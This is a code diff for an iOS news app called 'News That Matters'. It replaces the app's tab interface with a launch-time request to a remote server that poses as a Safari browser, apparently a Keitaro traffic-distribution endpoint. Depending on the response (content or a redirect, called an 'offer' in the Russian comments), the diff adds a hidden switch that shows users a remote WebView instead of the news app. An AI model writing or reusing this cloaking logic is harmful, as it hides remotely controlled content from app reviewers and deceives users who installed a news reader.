@@ -3,139 +3,139 @@
 //  News That Matters
 //
 //  Created by Simon Bakhanets on 04.01.2026.
+//  Integrated with WebView logic from dafoma_distribution
 //
 
 import SwiftUI
+import Foundation
 
 struct ContentView: View {
-    @EnvironmentObject var userSettings: UserSettings
-    @State private var selectedTab = 0
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
     
     var body: some View {
-        Group {
-            if !userSettings.hasCompletedOnboarding {
-                OnboardingView()
-            } else {
-                mainTabView
-            }
-        }
-    }
-    
-    private var mainTabView: some View {
-        TabView(selection: $selectedTab) {
-            HomeView()
-                .tabItem {
-                    Label("Home", systemImage: "house.fill")
-                }
-                .tag(0)
+        
+        ZStack {
             
-            SearchView()
-                .tabItem {
-                    Label("Search", systemImage: "magnifyingglass")
-                }
-                .tag(1)
-            
-            BookmarksView()
-                .tabItem {
-                    Label("Bookmarks", systemImage: "bookmark.fill")
-                }
-                .tag(2)
-            
-            SettingsView(userSettings: userSettings)
-                .tabItem {
-                    Label("Settings", systemImage: "gear")
-                }
-                .tag(3)
-        }
-        .accentColor(.primaryBackground)
-    }
-}
-
-// MARK: - Search View
-struct SearchView: View {
-    @StateObject private var viewModel = NewsFeedViewModel()
-    @State private var selectedArticle: Article?
-    
-    var body: some View {
-        NavigationView {
-            VStack {
-                if viewModel.searchQuery.isEmpty && viewModel.articles.isEmpty {
-                    emptySearchView
-                } else if viewModel.isLoading && viewModel.articles.isEmpty {
-                    loadingView
-                } else if viewModel.articles.isEmpty {
-                    noResultsView
-                } else {
-                    articlesList
+            if isFetched == false {
+                
+                ProgressView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    // Show News That Matters app
+                    NewsAppView()
+                    
+                } else if isBlock == false {
+                    
+                    // Show WebView
+                    WebSystem()
                 }
             }
-            .navigationTitle("Search")
-            .navigationBarTitleDisplayMode(.large)
-            .searchable(text: $viewModel.searchQuery, prompt: "Search news...")
-            .sheet(item: $selectedArticle) { article in
-                ArticleDetailView(article: article, viewModel: viewModel)
-            }
+        }
+        .onAppear {
+            
+            makeServerRequest()
         }
     }
     
-    private var emptySearchView: some View {
-        VStack(spacing: 20) {
-            Image(systemName: "magnifyingglass")
-                .font(.system(size: 60))
-                .foregroundColor(.textSecondary)
-            
-            Text("Search News")
-                .font(.system(.title2, design: .rounded))
-                .fontWeight(.semibold)
-            
-            Text("Search for any topic or keyword")
-                .font(.system(.body, design: .rounded))
-                .foregroundColor(.textSecondary)
-                .multilineTextAlignment(.center)
+    private func makeServerRequest() {
+        
+        let dataManager = DataManagers()
+        
+        guard let url = URL(string: dataManager.server) else {
+            self.isBlock = true
+            self.isFetched = true
+            return
         }
-        .padding()
-    }
-    
-    private var noResultsView: some View {
-        VStack(spacing: 20) {
-            Image(systemName: "doc.text.magnifyingglass")
-                .font(.system(size: 60))
-                .foregroundColor(.textSecondary)
+        
+        print("🚀 Making request to: \(url.absoluteString)")
+        print("🏠 Host: \(url.host ?? "unknown")")
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "GET"
+        request.timeoutInterval = 5.0
+        
+        // Добавляем заголовки для имитации браузера
+        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
+        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
+        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
+        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
+        
+        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
+        
+        // Создаем URLSession без автоматических редиректов
+        let config = URLSessionConfiguration.default
+        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
+        
+        session.dataTask(with: request) { data, response, error in
             
-            Text("No Results Found")
-                .font(.system(.title2, design: .rounded))
-                .fontWeight(.semibold)
-            
-            Text("Try searching for something else")
-                .font(.system(.body, design: .rounded))
-                .foregroundColor(.textSecondary)
-        }
-        .padding()
-    }
-    
-    private var loadingView: some View {
-        VStack(spacing: 20) {
-            ProgressView()
-                .scaleEffect(1.5)
-            Text("Searching...")
-                .font(.system(.body, design: .rounded))
-                .foregroundColor(.textSecondary)
-        }
-    }
-    
-    private var articlesList: some View {
-        ScrollView {
-            LazyVStack(spacing: 16) {
-                ForEach(viewModel.articles) { article in
-                    ArticleCardView(article: article) {
-                        selectedArticle = article
-                    } onBookmark: {
-                        viewModel.toggleBookmark(for: article)
+            DispatchQueue.main.async {
+                
+                // Если есть любая ошибка (включая SSL) - показываем приложение
+                if let error = error {
+                    print("❌ Network error: \(error.localizedDescription)")
+                    print("Server unavailable, showing News app")
+                    self.isBlock = true
+                    self.isFetched = true
+                    return
+                }
+                
+                // Если получили ответ от сервера
+                if let httpResponse = response as? HTTPURLResponse {
+                    
+                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
+                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
+                    
+                    // Логируем тело ответа для диагностики
+                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
+                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                     }
+                    
+                    if httpResponse.statusCode == 200 {
+                        // Проверяем, есть ли контент в ответе
+                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
+                        let hasContent = data?.count ?? 0 > 0
+                        
+                        if contentLength == "0" || !hasContent {
+                            // Пустой ответ = "do nothing" от Keitaro
+                            print("🚫 Empty response (do nothing): Showing News app")
+                            self.isBlock = true
+                            self.isFetched = true
+                        } else {
+                            // Есть контент = успех
+                            print("✅ Success with content: Showing WebView")
+                            self.isBlock = false
+                            self.isFetched = true
+                        }
+                        
+                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
+                        // Редиректы = успех (есть оффер)
+                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
+                        self.isBlock = false
+                        self.isFetched = true
+                        
+                    } else {
+                        // 404, 403, 500 и т.д. - показываем приложение
+                        print("🚫 Error code \(httpResponse.statusCode)): Showing News app")
+                        self.isBlock = true
+                        self.isFetched = true
+                    }
+                    
+                } else {
+                    
+                    // Нет HTTP ответа - показываем приложение
+                    print("❌ No HTTP response: Showing News app")
+                    self.isBlock = true
+                    self.isFetched = true
                 }
             }
-            .padding()
-        }
+            
+        }.resume()
     }
 }
 
